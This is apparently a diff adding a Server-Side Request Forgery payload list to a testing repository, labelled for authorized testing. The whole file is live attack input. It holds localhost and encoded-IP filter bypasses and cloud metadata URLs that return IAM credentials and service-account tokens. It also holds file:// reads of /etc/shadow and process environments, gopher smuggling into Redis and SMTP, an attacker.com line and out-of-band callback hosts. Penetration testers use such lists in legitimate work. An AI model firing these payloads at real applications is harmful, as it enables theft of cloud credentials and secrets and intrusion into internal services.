@@ -1,0 +1,108 @@
+# Server-Side Request Forgery (SSRF) Payloads
+# For authorized security testing only
+#
+# Replace YOUR-COLLABORATOR-URL with your Burp Collaborator or
+# interactsh URL to confirm out-of-band callbacks.
+
+# ─── LOCALHOST VARIANTS ───────────────────────────────────────────
+http://localhost
+http://localhost:80
+http://localhost:8080
+http://localhost:8443
+http://localhost:443
+http://127.0.0.1
+http://127.0.0.1:80
+http://127.0.0.1:8080
+http://127.0.0.1:8443
+http://127.1
+http://127.0.1
+http://0.0.0.0
+http://0
+http://[::1]
+http://[::ffff:127.0.0.1]
+http://[0:0:0:0:0:ffff:127.0.0.1]
+
+# ─── ENCODING BYPASSES ────────────────────────────────────────────
+http://0177.0.0.1          # Octal
+http://0x7f000001           # Hex
+http://2130706433           # Decimal
+http://00000177.00000000.00000000.00000001  # Octal padded
+http://127.000.000.001
+http:%2f%2f127.0.0.1
+http:%2F%2F127.0.0.1
+http:/%2f127.0.0.1
+
+# ─── CLOUD METADATA ENDPOINTS ─────────────────────────────────────
+# AWS IMDSv1
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/public-keys/
+http://169.254.169.254/latest/dynamic/instance-identity/document
+
+# AWS via DNS
+http://instance-data/latest/meta-data/
+http://169.254.169.254.xip.io/latest/meta-data/
+
+# GCP
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+http://169.254.169.254/computeMetadata/v1/
+
+# Azure
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01
+
+# DigitalOcean
+http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1/interfaces/public/0/ipv4/address
+
+# ─── INTERNAL NETWORK PROBING ─────────────────────────────────────
+http://192.168.0.1
+http://192.168.1.1
+http://10.0.0.1
+http://10.10.10.10
+http://172.16.0.1
+http://172.31.255.254
+
+# Common internal services
+http://localhost:6379          # Redis
+http://localhost:27017         # MongoDB
+http://localhost:5432          # PostgreSQL
+http://localhost:3306          # MySQL
+http://localhost:11211         # Memcached
+http://localhost:9200          # Elasticsearch
+http://localhost:8500          # Consul
+http://localhost:2379          # etcd
+http://localhost:4001          # etcd (old)
+http://localhost:8888          # Jupyter
+http://localhost:9090          # Prometheus
+http://localhost:3000          # Grafana / dev apps
+
+# ─── PROTOCOL SMUGGLING ───────────────────────────────────────────
+file:///etc/passwd
+file:///etc/shadow
+file:///proc/self/environ
+file:///windows/win.ini
+dict://localhost:6379/info
+gopher://localhost:6379/_INFO
+gopher://127.0.0.1:25/_EHLO localhost
+ftp://localhost:21
+ldap://localhost:389
+sftp://attacker.com/
+
+# ─── DNS REBINDING / BYPASS ───────────────────────────────────────
+http://localtest.me/
+http://customer1.app.localhost.my.company.127.0.0.1.nip.io/
+http://127.0.0.1.xip.io/
+http://spoofed.burpcollaborator.net/
+
+# ─── OUT-OF-BAND DETECTION ────────────────────────────────────────
+# Replace with your Burp Collaborator / interactsh URL
+http://YOUR-COLLABORATOR-URL/
+https://YOUR-COLLABORATOR-URL/
+http://YOUR-COLLABORATOR-URL:80/
+http://YOUR-COLLABORATOR-URL:443/
+dns://YOUR-COLLABORATOR-URL/
